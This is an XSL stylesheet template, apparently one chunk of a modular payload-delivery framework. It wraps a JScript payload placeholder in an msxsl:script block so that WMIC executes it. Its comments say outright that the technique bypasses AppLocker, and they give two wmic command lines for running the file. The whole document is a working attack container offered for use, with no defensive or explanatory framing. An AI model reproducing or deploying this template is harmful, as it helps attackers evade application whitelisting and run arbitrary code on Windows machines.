<!-- chunk: delivery/xsl_transform -->
<!-- provides: xsl_container -->
<!-- format: xsl -->
<!-- note: WMIC XSL stylesheet execution — wraps JScript in an XSL -->
<!--   stylesheet that WMIC can execute. Bypasses AppLocker.         -->
<!--   Execute via: wmic process list /format:"path\to\payload.xsl"  -->
<!--   Or: wmic os get /format:"path\to\payload.xsl"                 -->

<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    xmlns:user="urn:user-scripts">

<xsl:output method="text"/>

<msxsl:script implements-prefix="user" language="JScript">
<![CDATA[
function payload() {
    {{PAYLOAD_BODY}}
    return "";
}
]]>
</msxsl:script>

<xsl:template match="/">
<xsl:value-of select="user:payload()"/>
</xsl:template>

</xsl:stylesheet>
